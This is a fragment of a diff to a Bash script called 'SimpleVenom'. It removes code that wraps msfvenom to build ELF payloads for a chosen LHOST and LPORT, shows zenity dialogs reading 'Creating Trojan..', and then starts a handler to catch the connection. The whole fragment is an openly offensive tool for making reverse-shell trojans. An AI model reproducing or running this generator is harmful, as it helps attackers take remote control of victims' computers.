-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f elf -o "${setdir}/${namefile}"
-            echo "75" ; sleep 0.3
-            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "100" ; sleep 0.3
-            ) |
-            zenity --progress \
-            --width 400 \
-            --title="SimpleVenom $setversion / $owner" \
-            --text="Creating Trojan.." \
-            --percentage=0
-
-            if [ "$?" != 0 ] ; then
-                    zenity --error \
-                    --text="Aborted By User."
-                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
-                    rm "${setdir}/${namefile}"
-                    exit 0
-            fi
-        #####
-        else
-        #####
-            (
-            echo "10" ; sleep 0.3
-            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
-            echo "20" ; sleep 0.3
-            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f elf -o "${setdir}/${namefile}"
-            echo "75" ; sleep 0.3
-            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "100" ; sleep 0.3
-            ) |
-            zenity --progress \
-            --width 400 \
-            --title="SimpleVenom $setversion / $owner" \
-            --text="Creating Trojan.." \
-            --percentage=0
-
-            if [ "$?" != 0 ] ; then
-                    zenity --error \
-                    --text="Aborted By User."
-                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
-                    rm "${setdir}/${namefile}"
-                    exit 0
-            fi
-        fi
-
-        if [[ -f ${setdir}/${namefile} ]] ; then
-            if [[ $(du -k "${setdir}/${namefile}" | cut -f1) = "0" ]] ; then
-                echo "Can not Creating File!"
-                zenity --error --width 220 --text "Cann ot Creating The File!"
-                exit 1
-            else
-                zenity --info --width 300 --title "${setdir}/${namefile}" --text "LHOST: $lhost\nLPORT:$lport\nFILENAME:$namefile"
-                multihandlermonitor
-                exit 0
-            fi
-        fi
-
-    else
-        echo "thanks for use simplevenom (^-^)"
-        exit 0
-    fi
-done
+# Start the script
+main "$@"
